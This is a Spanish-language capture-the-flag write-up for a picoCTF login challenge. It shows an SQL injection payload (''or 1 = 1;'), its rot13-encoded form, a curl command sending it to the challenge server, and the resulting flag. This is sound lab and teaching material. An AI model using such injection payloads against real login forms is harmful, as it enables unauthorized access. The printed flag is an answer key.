## Objetivo 

There is a secure website running at `https://jupiter.challenges.picoctf.org/problem/29132/` ([link](https://jupiter.challenges.picoctf.org/problem/29132/)) or http://jupiter.challenges.picoctf.org:29132. Try to see if you can login as admin!

---
## Datos de acceso al nivel 

http://jupiter.challenges.picoctf.org:29132/

---
## Solución 
primero accedemos a la pagina que es similar a la de los retos Irish-Name-Repo 1 y Irish-Name-Repo 2 en el apartado de login 

![[Pasted image 20231009204741.png]]

como podemos ver ahora solo queda presente el campo de contraseña pero al igual que en los retos anteriores debemos buscar el recuadro oculto 

![[Pasted image 20231009204904.png]]

ya que tenemos eso nos topamos con el siguiente problema y es que si intentamos poner como contraseña 
``` 
'or 1 = 1;
```

aparecerá lo siguiente 

![[Pasted image 20231009205040.png]]

para corregir esto debemos hacer uso de [CyberChef (gchq.github.io)](https://gchq.github.io/CyberChef/) y rotar la contraseña con rot 13

![[Pasted image 20231004111514.png]]
como podemos ver nos arroja el siguiente resultado 

``` bash
'be 1 = 1;
```

ahora debemos usarlo como contraseña para que nos de la flag 

![[Pasted image 20231009205330.png]]

**Resultado Final**
```
picoCTF{3v3n_m0r3_SQL_06a9db19}
```

---
## Notas Adicionales 
Al igual que en los retos anteriores se pude llegar hasta la flag con el siguiente comando en la linea de comando 
```bash
curl https://jupiter.challenges.picoctf.org/problem/29132/login.php -d "password='be 1 = 1;&debug=1"
```

---
## Referencias 
[ROT13 - CyberChef (gchq.github.io)](https://gchq.github.io/CyberChef/#recipe=ROT13(true,true,false,13)&input=J29yIDEgPSAxOw)
[SQL Injection (w3schools.com)](https://www.w3schools.com/sql/sql_injection.asp)
